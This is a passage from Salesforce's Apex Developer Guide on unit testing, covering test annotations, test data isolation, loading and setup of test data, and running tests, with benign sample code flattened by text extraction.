data. The Apex exception handler and testing framework can’t determine if sensitive data is contained in user-defined messages
and details. To include personal data in custom Apex exceptions, we recommend that you create an Exception subclass with new
properties that hold the personal data. Then, don’t include subclass property information in the exception's message string.
Understanding Testing in Apex
What to Test in Apex
What Are Apex Unit Tests?
Understanding Test Data
Apex test data is transient and isn’t committed to the database.
Run Unit Test Methods
To verify the functionality of your Apex code, execute unit tests. You can run Apex test methods in the Developer Console, in Setup,
in the Salesforce extensions for Visual Studio Code, or using the API.
Testing Best Practices
Testing Example
Testing and Code Coverage
The Apex testing framework generates code coverage numbers for your Apex classes and triggers every time you run one or more
tests. Code coverage indicates how many executable lines of code in your classes and triggers have been exercised by test methods.
Write test methods to test your triggers and classes, and then run those tests to generate code coverage information.
Code Coverage Best Practices
Consider the following code coverage tips and best practices.
Build a Mocking Framework with the Stub API
Apex provides a stub API for implementing a mocking framework. A mocking framework has many benefits. It can streamline and
improve testing and help you create faster, more reliable tests. You can use it to test classes in isolation, which is important for unit
testing. Building your mocking framework with the stub API can also be beneficial because stub objects are generated at runtime.
Because these objects are generated dynamically, you don’t have to package and deploy test classes. You can build your own
mocking framework, or you can use one built by someone else.
Understanding Testing in Apex
Testing is the key to successful long-term development and is a critical component of the development process. We strongly recommend
that you use a test-driven development process, that is, test development that occurs at the same time as code development.
Why Test Apex?
Testing is key to the success of your application, particularly if your application is to be deployed to customers. If you validate that your
application works as expected, that there are no unexpected behaviors, your customers are going to trust you more.
704
Testing ApexApex Developer Guide

There are two ways of testing an application. One is through the Salesforce user interface, important, but merely testing through the
user interface will not catch all of the use cases for your application. The other way is to test for bulk functionality: up to 200 records can
be passed through your code if it's invoked using SOAP API or by a Visualforce standard set controller.
An application is seldom finished. You will have additional releases of it, where you change and extend functionality. If you have written
comprehensive tests, you can ensure that a regression is not introduced with any new functionality.
Before you can deploy your code or package it for the Salesforce AppExchange, the following must be true.
•
Unit tests must cover at least 75% of your Apex code, and all of those tests must complete successfully.
Note the following.
–
When deploying Apex to a production organization, each unit test in your organization namespace is executed by default.
–
Calls to System.debug aren’t counted as part of Apex code coverage.
–
Test methods and test classes aren’t counted as part of Apex code coverage.
–
While only 75% of your Apex code must be covered by tests, don’t focus on the percentage of code that is covered. Instead,
make sure that every use case of your application is covered, including positive and negative cases, as well as bulk and single
records. This approach ensures that 75% or more of your code is covered by unit tests.
•
Every trigger must have some test coverage.
•
All classes and triggers must compile successfully.
Salesforce runs all tests in all organizations that have Apex code to verify that no behavior has been altered as a result of any service
upgrades.
What to Test in Apex
Salesforce recommends that you write tests for the following:
Single action
Test to verify that a single record produces the correct, expected result.
Bulk actions
Any Apex code, whether a trigger, a class or an extension, may be invoked for 1 to 200 records. You must test not only the single
record case, but the bulk cases as well.
Positive behavior
Test to verify that the expected behavior occurs through every expected permutation, that is, that the user filled out everything
correctly and did not go past the limits.
Negative behavior
There are likely limits to your applications, such as not being able to add a future date, not being able to specify a negative amount,
and so on. You must test for the negative case and verify that the error messages are correctly produced as well as for the positive,
within the limits cases.
Restricted user
Test whether a user with restricted access to the sObjects used in your code sees the expected behavior. That is, whether they can
run the code or receive error messages.
Note:  Conditional and ternary operators are not considered executed unless both the positive and negative branches are executed.
For examples of these types of tests, see Testing Example on page 727.
705
Testing ApexApex Developer Guide

What Are Apex Unit Tests?
To facilitate the development of robust, error-free code, Apex supports the creation and execution of unit tests. Unit tests are class
methods that verify whether a particular piece of code is working properly. Unit test methods take no arguments, commit no data to
the database, and send no emails. Such methods are flagged with the @IsTest annotation in the method definition. Unit test methods
must be defined in test classes, that is, classes annotated with @IsTest.
For example:
@IsTest
privateclassmyClass{
@IsTest
staticvoidmyTest(){
// code_block
}
}
Use the @IsTest annotation to define classes and methods that only contain code used for testing your application. The @IsTest
annotation can take multiple modifiers within parentheses and separated by blanks.
Note:  The @IsTest annotation on methods is equivalent to the testMethod keyword. As best practice, Salesforce
recommends that you use @IsTest rather than testMethod. The testMethod keyword may be versioned out in a future
release.
This example of a test class contains two test methods.
@IsTest
privateclassMyTestClass{
// Methodsfor testing
@IsTest
staticvoidtest1(){
// Implementtestcode
}
@IsTest
staticvoidtest2(){
// Implementtestcode
}
}
Classes and methods defined as @IsTest can be either private or public. The access level of test classes methods doesn’t
matter. You need not add an access modifier when defining a test class or test methods. The default access level in Apex is private. The
testing framework can always find the test methods and execute them, regardless of their access level.
Classes defined as @IsTest must be top-level classes and can't be interfaces or enums.
Methods of a test class can only be called from a test method or code invoked by a test method; non-test requests can’t invoke it.
This example shows a class to be tested and its corresponding test class. It contains two methods and a constructor.
publicclassTVRemoteControl{
// Volumeto be modified
Integervolume;
// Constantfor maximumvolumevalue
staticfinalIntegerMAX_VOLUME= 50;
706
Testing ApexApex Developer Guide

// Constructor
publicTVRemoteControl(Integerv) {
// Set initialvaluefor volume
volume= v;
}
publicIntegerincreaseVolume(Integeramount){
volume+= amount;
if (volume> MAX_VOLUME){
volume= MAX_VOLUME;
}
returnvolume;
}
publicIntegerdecreaseVolume(Integeramount){
volume-= amount;
if (volume< 0) {
volume= 0;
}
returnvolume;
}
publicstaticStringgetMenuOptions(){
return'AUDIOSETTINGS- VIDEOSETTINGS';
}
}
This example contains the corresponding test class with four test methods. Each method in the previous class is called. Although there’s
sufficient test coverage, the test methods in the test class perform extra testing to verify boundary conditions.
@IsTest
classTVRemoteControlTest{
@IsTest
staticvoidtestVolumeIncrease(){
TVRemoteControlrc = new TVRemoteControl(10);
IntegernewVolume= rc.increaseVolume(15);
System.assertEquals(25,newVolume);
}
@IsTest
staticvoidtestVolumeDecrease(){
TVRemoteControlrc = new TVRemoteControl(20);
IntegernewVolume= rc.decreaseVolume(15);
System.assertEquals(5,newVolume);
}
@IsTest
staticvoidtestVolumeIncreaseOverMax(){
TVRemoteControlrc = new TVRemoteControl(10);
IntegernewVolume= rc.increaseVolume(100);
System.assertEquals(50,newVolume);
}
@IsTest
707
Testing ApexApex Developer Guide

staticvoidtestVolumeDecreaseUnderMin(){
TVRemoteControlrc = new TVRemoteControl(10);
IntegernewVolume= rc.decreaseVolume(100);
System.assertEquals(0,newVolume);
}
@IsTest
staticvoidtestGetMenuOptions(){
// Staticmethodcall.No needto createa classinstance.
Stringmenu= TVRemoteControl.getMenuOptions();
System.assertNotEquals(null, menu);
System.assertNotEquals('', menu);
}
}
Unit Test Considerations
Here are some things to note about unit tests.
•
Starting with Salesforce API 28.0, test methods can no longer reside in non-test classes and must be part of classes annotated with
IsTest. See the TestVisible annotation to learn how you can access private class members from a test class.
•
Test methods can’t be used to test Web service callouts. Instead, use mock callouts. See Test Web Service Callouts and Testing HTTP
Callouts.
•
You can’t send email messages from a test method.
•
Since test methods don’t commit data created in the test, you don’t have to delete test data upon completion.
•
If the value of a static member variable in a test class is changed in a testSetup or test method, the new value isn’t preserved. Other
test methods in this class get the original value of the static member variable. This behavior also applies when the static member
variable is defined in another class and accessed in test methods.
•
For some sObjects that have fields with unique constraints, inserting duplicate sObject records results in an error. For example,
inserting CollaborationGroup sObjects with the same names results in an error because CollaborationGroup records must have
unique names.
•
Tracked changes for a record (FeedTrackedChange records) in Chatter feeds aren't available when test methods modify the associated
record. FeedTrackedChange records require the change to the parent record they're associated with to be committed to the database
before they're created. Since test methods don't commit data, they don't result in the creation of FeedTrackedChange records.
Similarly, field history tracking records can't be created in test methods because they require other sObject records to be committed
first. For example, AccountHistory records can’t be created in test methods because Account records must be committed first.
•
If your tests include DML, make sure that you don’t exceed the MAX_DML_ROWS limit. See “Miscellaneous Apex Limits” in Execution
Governors and Limits
1.Accessing Private Test Class Members
SEE ALSO:
IsTest Annotation
Accessing Private Test Class Members
Test methods are defined in a test class, separate from the class they test. This can present a problem when having to access a private
class member variable from the test method, or when calling a private method. Because these are private, they aren’t visible to the test
708
Testing ApexApex Developer Guide

class. You can either modify the code in your class to expose public methods that will make use of these private class members, or you
can simply annotate these private class members with TestVisible. When you annotate private or protected members with this
annotation, they can be accessed by test methods and only code running in test context.
This example shows how TestVisible is used with private member variables, a private inner class with a constructor, a private
method, and a private custom exception. All these can be accessed in the test class because they’re annotated with TestVisible.
The class is listed first and is followed by a test class containing the test methods.
publicclassVisibleSampleClass{
// Privatemembervariables
@TestVisibleprivateIntegerrecordNumber= 0;
@TestVisibleprivateStringareaCode= '(415)';
// Publicmembervariable
publicIntegermaxRecords= 1000;
// Privateinnerclass
@TestVisibleclassEmployee{
StringfullName;
Stringphone;
// Constructor
@TestVisibleEmployee(Strings, Stringph) {
fullName= s;
phone= ph;
}
}
// Privatemethod
@TestVisibleprivateStringprivateMethod(Employeee) {
System.debug('I am private.');
recordNumber++;
Stringphone= areaCode+ ' ' + e.phone;
Strings = e.fullName+ '\'sphonenumberis ' + phone;
System.debug(s);
returns;
}
// Publicmethod
publicvoidpublicMethod(){
maxRecords++;
System.debug('I am public.');
}
// Privatecustomexceptionclass
@TestVisibleprivateclassMyExceptionextendsException{}
}
// Testclassfor VisibleSampleClass
@isTest
privateclassVisibleSampleClassTest{
// Thistestmethodcan accessprivatemembersof anotherclass
// thatare annotatedwith@TestVisible.
statictestmethodvoidtest1(){
VisibleSampleClasssample= new VisibleSampleClass();
709
Testing ApexApex Developer Guide

// Accessprivatedatamembersand updatetheirvalues
sample.recordNumber= 100;
sample.areaCode= '(510)';
// Accessprivateinnerclass
VisibleSampleClass.Employeeemp =
new VisibleSampleClass.Employee('JoeSmith', '555-1212');
// Callprivatemethod
Strings = sample.privateMethod(emp);
// Verifyresult
System.assert(
s.contains('(510)') &&
s.contains('JoeSmith') &&
s.contains('555-1212'));
}
// Thistestmethodcan throwprivateexceptiondefinedin anotherclass
statictestmethodvoidtest2(){
// Throwprivateexception.
try {
thrownew VisibleSampleClass.MyException('Thrownfroma test.');
} catch(VisibleSampleClass.MyExceptione) {
// Handleexception
}
}
statictestmethodvoidtest3(){
// Accesspublicmethod.
// No @TestVisibleis used.
VisibleSampleClasssample= new VisibleSampleClass();
sample.publicMethod();
}
}
The TestVisible annotation can be handy when you upgrade the Salesforce API version of existing classes containing mixed test
and non-test code. Because test methods aren’t allowed in non-test classes starting in API version 28.0, you must move the test methods
from the old class into a new test class (a class annotated with isTest) when you upgrade the API version of your class. You might
run into visibility issues when accessing private methods or member variables of the original class. In this case, just annotate these private
members with TestVisible.
Understanding Test Data
Apex test data is transient and isn’t committed to the database.
This means that after a test method finishes execution, the data inserted by the test doesn’t persist in the database. As a result, there is
no need to delete any test data at the conclusion of a test. Likewise, all the changes to existing records, such as updates or deletions,
don’t persist. This transient behavior of test data makes the management of data easier as you don’t have to perform any test data
cleanup. At the same time, if your tests access organization data, this prevents accidental deletions or modifications to existing records.
710
Testing ApexApex Developer Guide

By default, existing organization data isn’t visible to test methods, with the exception of certain setup objects. You should create test
data for your test methods whenever possible. However, test code saved against Salesforce API version 23.0 or earlier has access to all
data in the organization. Data visibility for tests is covered in more detail in the next section.
Isolation of Test Data from Organization Data in Unit Tests
Using the isTest(SeeAllData=True) Annotation
Annotate your test class or test method with IsTest(SeeAllData=true) to open up data access to records in your
organization. The IsTest(SeeAllData=true) annotation applies to data queries but doesn't apply to record creation or changes,
including deletions. New and changed records are still rolled back in Apex tests even when using the annotation.
Loading Test Data
Using the Test.loadData method, you can populate data in your test methods without having to write many lines of code.
Common Test Utility Classes for Test Data Creation
Common test utility classes are public test classes that contain reusable code for test data creation.
Using Test Setup Methods
Use test setup methods (methods that are annotated with @testSetup) to create test records once and then access them in
every test method in the test class. Test setup methods can be time-saving when you need to create reference or prerequisite data
for all test methods, or a common set of records that all test methods operate on.
Isolation of Test Data from Organization Data in Unit Tests
By default, Apex test methods (API version 24.0 and later) can’t access pre-existing org data such as standard objects, custom objects,
and custom settings data. They can only access data that they create. However, objects that are used to manage your organization or
metadata objects can still be accessed in your tests. These are some examples of such objects.
•
User
•
Profile
•
Organization
•
CronTrigger
•
RecordType
•
ApexClass
•
ApexTrigger
•
ApexComponent
•
ApexPage
Whenever possible, create test data for each test. You can disable this restriction by annotating your test class or test method with the
IsTest(SeeAllData=true) annotation.
Test code saved using Salesforce API version 23.0 or earlier continues to have access to all data in the organization and its data access
is unchanged.
Data Access Considerations
•
When working with data silo Apex tests, cross-object field references using the Owner relationship aren’t supported. Due to
this limitation, SELECTOwner.IsActiveFROMAccount returns null when run within a data silo Apex test.
•
If a new test method saved using Salesforce API version 24.0 or later calls a method in another class saved using version 23.0 or
earlier, the data access restrictions of the caller are enforced in the called method. The called method can’t access organization
data because the caller can’t access it, even though it was saved in an earlier version.
711
Testing ApexApex Developer Guide

•
The IsTest(SeeAllData=true) annotation has no effect when added to Apex code saved using Salesforce API version
23.0 and earlier.
•
This access restriction to test data applies to all code running in test context. For example, if a test method causes a trigger to
execute and the test can’t access organization data, the trigger won’t be able to either.
•
If a test makes a Visualforce request, the executing test stays in test context but runs in a different thread. Therefore, test data
isolation is no longer enforced. In this case, the test will be able to access all data in the organization after initiating the Visualforce
request. However, if the Visualforce request performs a callback, such as a JavaScript remoting call, any data inserted by the
callback isn’t visible to the test.
•
The VLOOKUP validation rule function, in API version 27.0 and earlier, always looks up org data in addition to test data when
fired by a running Apex test. Starting with version 28.0, the VLOOKUP validation rule function no longer accesses organization
data from a running Apex test. The function looks up only data created by the test, unless the test class or method is annotated
with IsTest(SeeAllData=true).
•
There can be some cases where you can’t create certain types of data from your test method because of specific limitations.
Here are some examples of such limitations.
–
Some standard objects aren’t creatable. For more information on these objects, see the Object Reference for Salesforce.
–
For some sObjects that have fields with unique constraints, inserting duplicate sObject records results in an error. For example,
inserting CollaborationGroup sObjects with the same names results in an error because CollaborationGroup records must
have unique names. This error occurs whether your test is annotated with IsTest(SeeAllData=true), or not.
–
Records that are created only after related records are committed to the database, like tracked changes in Chatter. Tracked
changes for a record (FeedTrackedChange records) in Chatter feeds aren't available when test methods modify the associated
record. FeedTrackedChange records require the change to the parent record they're associated with to be committed to
the database before they're created. Since test methods don't commit data, they don't result in the creation of
FeedTrackedChange records. Similarly, field history tracking records can't be created in test methods because they require
other sObject records to be committed first. For example, AccountHistory records can’t be created in test methods because
Account records must be committed first.
•
When working with data silo Apex tests, Salesforce recommends that you don’t share record IDs between test data and org data,
thereby preventing test data from accessing pre-existing org data.
Using the isTest(SeeAllData=True) Annotation
Annotate your test class or test method with IsTest(SeeAllData=true) to open up data access to records in your organization.
The IsTest(SeeAllData=true) annotation applies to data queries but doesn't apply to record creation or changes, including deletions.
New and changed records are still rolled back in Apex tests even when using the annotation.
Warning:  By annotating your class with @isTest(SeeAllData=true), you allow test methods to access all org records.
The best practice, however, is to run Apex tests with data silo using @isTest(SeeAllData=false). For data access
considerations in Salesforce API version 23.0 and earlier, see Isolation of Test Data from Organization Data in Unit Tests on page
711.
This example shows how to define a test class with the @IsTest(SeeAllData=true) annotation. All the test methods in this
class have access to all data in the organization.
// All testmethodsin thisclasscan accessall data.
@IsTest(SeeAllData=true)
publicclassTestDataAccessClass{
// Thistestaccessesan existingaccount.
// It alsocreatesand accessesa new testaccount.
@IsTest
712
Testing ApexApex Developer Guide

staticvoidmyTestMethod1(){
// Queryan existingaccountin the organization.
Accounta = [SELECTId, NameFROMAccountWHEREName='Acme'LIMIT1];
System.assert(a!= null);
// Createa testaccountbasedon the queriedaccount.
AccounttestAccount= a.clone();
testAccount.Name= 'AcmeTest';
inserttestAccount;
// Querythe testaccountthatwas inserted.
AccounttestAccount2= [SELECTId, NameFROMAccount
WHEREName='AcmeTest'LIMIT1];
System.assert(testAccount2!= null);
}
// Likethe previousmethod,thistestmethodcan alsoaccessall data
// becausethe containingclassis annotatedwith@IsTest(SeeAllData=true).
@IsTest
staticvoidmyTestMethod2(){
// Can accessall datain the organization.
}
}
This second example shows how to apply the @IsTest(SeeAllData=true) annotation on a test method. Because the test
method’s class isn’t annotated, you have to annotate the method to enable access to all data for the method. The second test method
doesn’t have this annotation, so it can access only the data it creates. In addition, it can access objects that are used to manage your
organization, such as users.
// Thisclasscontainstestmethodswithdifferentdataaccesslevels.
@IsTest
privateclassClassWithDifferentDataAccess{
// Testmethodthathas accessto all data.
@IsTest(SeeAllData=true)
staticvoidtestWithAllDataAccess(){
// Can queryall datain the organization.
}
// Testmethodthathas accessto onlythe datait creates
// and organizationsetupand metadataobjects.
@IsTest
staticvoidtestWithOwnDataAccess(){
// Thismethodcan stillaccessthe Userobject.
// Thisqueryreturnsthe firstuserobject.
Useru = [SELECTUserName,EmailFROMUserLIMIT1];
System.debug('UserName:' + u.UserName);
System.debug('Email:' + u.Email);
// Can accessthe testaccountthatis createdhere.
Accounta = new Account(Name='TestAccount');
inserta;
713
Testing ApexApex Developer Guide

// Accessthe accountthatwas justcreated.
AccountinsertedAcct= [SELECTId,NameFROMAccount
WHEREName='TestAccount'];
System.assert(insertedAcct!= null);
}
}
Considerations for the @IsTest(SeeAllData=true) Annotation
•
If a test class is defined with the @IsTest(SeeAllData=true) annotation, the SeeAllData=true applies to all
test methods that don’t explicitly set the SeeAllData keyword.
•
The @IsTest(SeeAllData=true) annotation is used to open up data access when applied at the class or method level.
However, if the containing class has been annotated with @IsTest(SeeAllData=true), annotating a method with
@IsTest(SeeAllData=false) is ignored for that method. In this case, that method still has access to all the data in
the organization. Annotating a method with @IsTest(SeeAllData=true) overrides, for that method, an
@IsTest(SeeAllData=false) annotation on the class.
•
@IsTest(SeeAllData=true) and @IsTest(IsParallel=true) annotations can’t be used together on the
same Apex method.
Loading Test Data
Using the Test.loadData method, you can populate data in your test methods without having to write many lines of code.
Follow these steps:
1.Add the data in a .csv file.
2.Create a static resource for this file.
3.Call Test.loadData within your test method and passing it the sObject type token and the static resource name.
For example, for Account records and a static resource name of myResource, make the following call:
List<sObject>ls = Test.loadData(Account.sObjectType,'myResource');
The Test.loadData method returns a list of sObjects that correspond to each record inserted.
You must create the static resource prior to calling this method. The static resource is a comma-delimited file ending with a .csv extension.
The file contains field names and values for the test records. The first line of the file must contain the field names and subsequent lines
are the field values. To learn more about static resources, see “Defining Static Resources” in the Salesforce online help.
Once you create a static resource for your .csv file, the static resource will be assigned a MIME type. Supported MIME types are:
•
text/csv
•
application/vnd.ms-excel
•
application/octet-stream
•
text/plain
Test.loadData Example
The following are steps for creating a sample .csv file and a static resource, and calling Test.loadData to insert the test records.
1.Create a .csv file that has the data for the test records. This sample .csv file has three account records. You can use this sample content
to create your .csv file.
Name,Website,Phone,BillingStreet,BillingCity,BillingState,BillingPostalCode,BillingCountry
sForceTest1,http://www.sforcetest1.com,(415)901-7000,TheLandmark@ One Market,San
714
Testing ApexApex Developer Guide

Francisco,CA,94105,US
sForceTest2,http://www.sforcetest2.com,(415)901-7000,TheLandmark@ One MarketSuite
300,SanFrancisco,CA,94105,US
sForceTest3,http://www.sforcetest3.com,(415)901-7000,1MarketSt,San
Francisco,CA,94105,US
2.Create a static resource for the .csv file:
a.From Setup, enter StaticResources in the QuickFind box, then select Static Resources.
b.Click New.
c.Name your static resource testAccounts.
d.Choose the file you created.
e.Click Save.
3.Call Test.loadData in a test method to populate the test accounts.
@isTest
privateclassDataUtil{
statictestmethodvoidtestLoadData(){
// Loadthe testaccountsfromthe staticresource
List<sObject>ls = Test.loadData(Account.sObjectType,'testAccounts');
// Verifythatall 3 testaccountswerecreated
System.assert(ls.size()== 3);
// Get firsttestaccount
Accounta1 = (Account)ls[0];
StringacctName= a1.Name;
System.debug(acctName);
// Performsometestingusingthe testrecords
}
}
Common Test Utility Classes for Test Data Creation
Common test utility classes are public test classes that contain reusable code for test data creation.
Public test utility classes are defined with the IsTest annotation, and as such, are excluded from the organization code size limit and
execute in test context. They can be called by test methods but not by non-test code.
The methods in the public test utility class are defined the same way methods are in non-test classes. They can take parameters and can
return a value. The methods must be declared as public or global to be visible to other test classes. These common methods can be
called by any test method in your Apex classes to set up test data before running the test. While you can create public methods for test
data creation in a regular Apex class, without the IsTest annotation, you don’t get the benefit of excluding this code from the
organization code size limit.
This is an example of a test utility class. It contains one method, createTestRecords, which accepts the number of accounts to
create and the number of contacts per account. The next example shows a test method that calls this method to create some data.
@IsTest
publicclassTestDataFactory{
publicstaticvoidcreateTestRecords(IntegernumAccts,IntegernumContactsPerAcct){
List<Account>accts= new List<Account>();
715
Testing ApexApex Developer Guide

for(Integeri=0;i<numAccts;i++){
Accounta = new Account(Name='TestAccount'+ i);
accts.add(a);
}
insertaccts;
List<Contact>cons= new List<Contact>();
for (Integerj=0;j<numAccts;j++){
Accountacct= accts[j];
// For eachaccountjustinserted,add contacts
for (Integerk=numContactsPerAcct*j;k<numContactsPerAcct*(j+1);k++){
cons.add(new Contact(firstname='Test'+k,
lastname='Test'+k,
AccountId=acct.Id));
}
}
// Insertall contactsfor all accounts
insertcons;
}
}
The test method in this class calls the test utility method, createTestRecords, to create five test accounts with three contacts
each.
@IsTest
privateclassMyTestClass{
statictestmethodvoidtest1(){
TestDataFactory.createTestRecords(5,3);
// Run sometests
}
}
Using Test Setup Methods
Use test setup methods (methods that are annotated with @testSetup) to create test records once and then access them in every
test method in the test class. Test setup methods can be time-saving when you need to create reference or prerequisite data for all test
methods, or a common set of records that all test methods operate on.
Test setup methods can reduce test execution times especially when you’re working with many records. Test setup methods enable
you to create common test data easily and efficiently. By setting up records once for the class, you don’t need to re-create records for
each test method. Also, because the rollback of records that are created during test setup happens at the end of the execution of the
entire class, the number of records that are rolled back is reduced. As a result, system resources are used more efficiently compared to
creating those records and having them rolled back for each test method.
If a test class contains a test setup method, the testing framework executes the test setup method first, before any test method in the
class. Records that are created in a test setup method are available to all test methods in the test class and are rolled back at the end of
test class execution. If a test method changes those records, such as record field updates or record deletions, those changes are rolled
back after each test method finishes execution. The next executing test method gets access to the original unmodified state of those
records.
Similarly, if you create a static variable in a test setup method, and then modify that variable in a test method, the change doesn’t persist
to other test methods. Every test method, including the test setup method, runs as a separate transaction. The static context of the test
class is reinitialized before each transaction begins. Therefore, static variable initializers and static blocks are executed fresh at the start
716
Testing ApexApex Developer Guide

of every test method. Any change to a static variable within a test setup method is confined to that specific transaction. After the
transaction completes, those in-memory changes are discarded.
Syntax
Test setup methods are defined in a test class, take no arguments, and return no value. The following is the syntax of a test setup method.
@testSetupstaticvoidmethodName() {
}
Example
This example shows how to create test records once and then access them in multiple test methods. Also, the example shows how
changes that are made in the first test method are rolled back and are not available to the second test method.
@isTest
privateclassCommonTestSetup{
@testSetupstaticvoidsetup(){
// Createcommontestaccounts
List<Account>testAccts= new List<Account>();
for(Integeri=0;i<2;i++){
testAccts.add(new Account(Name= 'TestAcct'+i));
}
inserttestAccts;
}
@isTeststaticvoidtestMethod1(){
// Get the firsttestaccountby usinga SOQLquery
Accountacct= [SELECTId FROMAccountWHEREName='TestAcct0'LIMIT1];
// Modifyfirstaccount
acct.Phone= '555-1212';
// Thisupdateis localto thistestmethodonly.
updateacct;
// Deletesecondaccount
Accountacct2= [SELECTId FROMAccountWHEREName='TestAcct1'LIMIT1];
// Thisdeletionis localto thistestmethodonly.
deleteacct2;
// Performsometesting
}
@isTeststaticvoidtestMethod2(){
// The changesmadeby testMethod1()are rolledbackand
// are not visibleto thistestmethod.
// Get the firstaccountby usinga SOQLquery
Accountacct= [SELECTPhoneFROMAccountWHEREName='TestAcct0'LIMIT1];
// Verifythattestaccountcreatedby testsetupmethodis unaltered.
System.assertEquals(null, acct.Phone);
// Get the secondaccountby usinga SOQLquery
Accountacct2= [SELECTId FROMAccountWHEREName='TestAcct1'LIMIT1];
717
Testing ApexApex Developer Guide

// Verifytestaccountcreatedby testsetupmethodis unaltered.
System.assertNotEquals(null, acct2);
// Performsometesting
}
}
Test Setup Method Considerations
•
Test setup methods are supported only with the default data isolation mode for a test class. If the test class or a test method has
access to organization data by using the @isTest(SeeAllData=true) annotation, test setup methods aren’t supported in
this class. Because data isolation for tests is available for API versions 24.0 and later, test setup methods are also available for those
versions only.
•
You can have only one test setup method per test class.
•
If a fatal error occurs during the execution of a test setup method, such as an exception that’s caused by a DML operation or an
assertion failure, the entire test class fails, and no further tests in the class are executed.
•
If a test setup method calls a non-test method of another class, no code coverage is calculated for the non-test method.
Run Unit Test Methods
To verify the functionality of your Apex code, execute unit tests. You can run Apex test methods in the Developer Console, in Setup, in
the Salesforce extensions for Visual Studio Code, or using the API.
You can run these groupings of unit tests.
•
Some or all methods in a specific class
•
Some or all methods in a set of classes
•
A predefined suite of classes, known as a test suite
•
All unit tests in your org
To run a test, use any of the following:
•
Salesforce user interface
•
Salesforce extensions for Visual Studio Code and Code Builder
•
Developer Console
•
The API
All Apex tests that are started from the Salesforce user interface (including the Developer Console) run asynchronously and in parallel.
Apex test classes are placed in the Apex job queue for execution. The maximum number of test classes that you can run per 24-hour
period is the greater of 500 or 10 multiplied by the number of test classes in the org. For sandbox and Developer Edition organizations,
this limit is higher and is the greater of 500 or 20 multiplied by the number of test classes in the org.
Note:  Apex tests that run as part of a deployment always run synchronously and serially.
Running Tests Through the Salesforce User Interface
You can run unit tests on the Application Test Execution page. Tests started on this page run asynchronously, that is, you don't have to
wait for a test class execution to finish. The Application Test Execution page refreshes the status of a test and displays the results after
the test completes.
718
Testing ApexApex Developer Guide

1.From Setup, enter ApplicationTestExecution in the QuickFind box, then select Application Test Execution.
2.Click Select Tests....
Note:  If you have Apex classes that are installed from a managed package, you must compile these classes first by clicking
Compile all classes on the Apex Classes page so that they appear in the list.
3.Select the tests to run. The list of tests includes only classes that contain test methods.
•
To select tests from an installed managed package, select the managed package’s corresponding namespace from the dropdown
list. Only the classes of the managed package with the selected namespace appear in the list.
•
To select tests that exist locally in your organization, select [My Namespace] from the dropdown list. Only local classes that
aren't from managed packages appear in the list.
•
To select any test, select [All Namespaces] from the dropdown list. All the classes in the organization appear, even those in a
managed package.
Note:  Classes with tests currently running don't appear in the list.
4.To opt out of collecting code coverage information during test runs, select Skip Code Coverage.
5.Click Run.
After you run tests using the Application Test Execution page, you can view code coverage details in the Developer Console.
From Setup, enter Application in the QuickFind box, select Application Test Execution, then click View Test History to
view all test results for your organization, not just tests that you have run. Test results are retained for 30 days after they finish running,
unless cleared.
Running Tests Using the Salesforce Extensions for Visual Studio Code
You can execute tests with Visual Studio Code. See Salesforce Extensions for Visual Studio Code and Code Builder.
Running Tests Using the Developer Console
In the Developer Console, you can execute some or all tests in specific test classes, set up and run test suites, or run all tests. The Developer
Console runs tests asynchronously in the background, unless your test run includes only one class and you’ve not chosen Always Run
Asynchronously in the Test menu. Running tests asynchronously lets you work in other areas of the Developer Console while tests are
719
Testing ApexApex Developer Guide

running. After the tests execute, you can inspect the test results in the Developer Console. Also, you can inspect the overall code coverage
for classes covered by the tests.
For more information, see the Developer Console documentation in Salesforce Help.
Running Tests Using the API
You can use the runTests() call from SOAP API to run tests synchronously.
RunTestsResult[]runTests(RunTestsRequestri)
This call allows you to run the following, as specified in the RunTestsRequest object:
•
All tests in all classes
•
All tests in a specific namespace
•
All tests in a subset of classes in a specific namespace
It returns the following:
•
Total number of tests that ran
•
Code coverage statistics
•
Error information for each failed test
•
Information for each test that succeeds
•
Time it took to run the test
For more information on runTests(), see runTests() in the SOAP API Developer Guide.
You can also run tests using the Tooling REST API. Use the /runTestsAsynchronous/ and /runTestsSynchronous/
endpoints to run tests asynchronously or synchronously. For usage details, see Tooling API: REST Resources.
Running Tests Using ApexTestQueueItem
You can run tests asynchronously using ApexTestQueueItem and ApexTestResult. These objects let you add tests to the
Apex job queue and check the results of the completed test runs. This process enables you to not only start tests asynchronously but
also schedule your tests to execute at specific times by using the Apex scheduler. See Apex Scheduler for more information.
Insert an ApexTestQueueItem object to place its corresponding Apex class in the Apex job queue for execution. The Apex job
executes the test methods in the class. After the job executes, ApexTestResult contains the result for each single test method
executed as part of the test.
ApexTestResult rows are also generated for Apex tests run with the @testSetup annotation. The IsTestSetup field is
set to true for these annotated tests to distinguish them from other test methods. The TestSetupTime field on
ApexTestRunResult tracks the cumulative time of all setup methods for the given ApexTestRunResult.
To abort a class that is in the Apex job queue, perform an update operation on the ApexTestQueueItem object and set its Status
field to Aborted.
If you insert multiple Apex test queue items in a single bulk operation, the queue items share a parent job and a test run can execute
tests for several classes.
The maximum number of test queue items, and hence classes, that you can insert in the Apex job queue is the greater of 500 or 10
multiplied by the number of test classes in the org. For sandbox and Developer Edition organizations, this limit is higher and is the greater
of 500 or 20 multiplied by the number of test classes in the org.
You may observe slower async test execution time when compilation is required, for example when tests are run after altering an Apex
class. This is because parallel test execution is restricted to one job until compilation is completed. If you have Apex code in your org that
720
Testing ApexApex Developer Guide

is referenced by queued tests and fails to compile, you will be limited to the one concurrent job. You must ensure that Apex code in
your org compiles successfully.
This example uses DML operations to insert and query the ApexTestQueueItem and ApexTestResult objects. The
enqueueTests method inserts queue items for all classes that end with Test. It then returns the parent job ID of one queue item,
which is the same for all queue items because they were inserted in bulk. The checkClassStatus method retrieves all queue
items that correspond to the specified job ID. It then queries and outputs the name, job status, and pass rate for each class. The
checkMethodStatus method gets information of each test method that was executed as part of the job.
publicclassTestUtil{
// Enqueueall classesendingin "Test".
publicstaticID enqueueTests(){
ApexClass[]testClasses=
[SELECTId FROMApexClass
WHERENameLIKE'%Test'];
if (testClasses.size()> 0) {
ApexTestQueueItem[]queueItems= new List<ApexTestQueueItem>();
for (ApexClasscls : testClasses){
queueItems.add(new ApexTestQueueItem(ApexClassId=cls.Id));
}
insertqueueItems;
// Get the job ID of the firstqueueitemreturned.
ApexTestQueueItemitem=
[SELECTParentJobIdFROMApexTestQueueItem
WHEREId=:queueItems[0].IdLIMIT1];
returnitem.parentjobid;
}
returnnull;
}
// Get the statusand passratefor eachclass
// whosetestswererun by the job.
// thatcorrespondto the specifiedjob ID.
publicstaticvoidcheckClassStatus(ID jobId){
ApexTestQueueItem[]items=
